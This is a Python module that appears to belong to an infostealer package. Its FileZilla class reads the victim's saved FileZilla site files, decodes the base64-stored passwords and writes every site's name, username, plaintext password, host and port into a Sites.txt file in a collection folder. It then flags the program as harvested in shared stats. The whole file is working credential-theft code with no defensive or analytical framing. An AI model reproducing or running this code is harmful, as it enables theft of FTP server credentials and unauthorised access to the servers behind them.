from base64 import b64decode
from xml.etree import ElementTree
from multiprocessing import Process
from os import listdir, path, makedirs

from ..utils.config import FileZillaConfig, programs_stats


class FileZilla(Process):

    def __init__(self, *args):
        Process.__init__(self)

        self.config = FileZillaConfig()

        for index, variable in enumerate(self.config.Variables):
            self.__dict__.update({variable: args[index]})

    def __create_folder(self):

        folder = rf"{self.storage_path}\{self.folder}"

        if not path.exists(folder):
            makedirs(folder)

    def __get_sites(self):

        if not path.exists(self.config.SitesPath):
            return

        files = listdir(self.config.SitesPath)
        data_files = self.config.DataFiles

        if not any(file in data_files for file in files):
            return

        self.__create_folder()

        temp = []

        for file in data_files:

            root = ElementTree.parse(rf"{self.config.SitesPath}\{file}").getroot()
            data = self.config.FileZillaData

            if not root:
                continue

            for server in root[0].findall("Server"):

                site_name = server.find("Name").text if hasattr(server.find("Name"), "text") else ""
                site_user = server.find("User").text if hasattr(server.find("User"), "text") else ""
                site_pass = server.find("Pass").text if hasattr(server.find("Pass"), "text") else ""
                site_host = server.find("Host").text if hasattr(server.find("Host"), "text") else ""
                site_port = server.find("Port").text if hasattr(server.find("Port"), "text") else ""
                site_pass = b64decode(site_pass).decode("utf-8")

                temp.append(data.format(site_name, site_user, site_pass, site_host, site_port))

        programs_stats['filezilla'] = True

        with open(rf"{self.storage_path}\{self.folder}\Sites.txt", "a", encoding="utf-8") as file_zilla:
            file_zilla.write("".join(item for item in temp))

    def run(self):

        try:

            if self.statuses[0] is True:
                self.__get_sites()

        except Exception as e:
            if self.errors is True: print(f"[FilleZilla]: {repr(e)}")
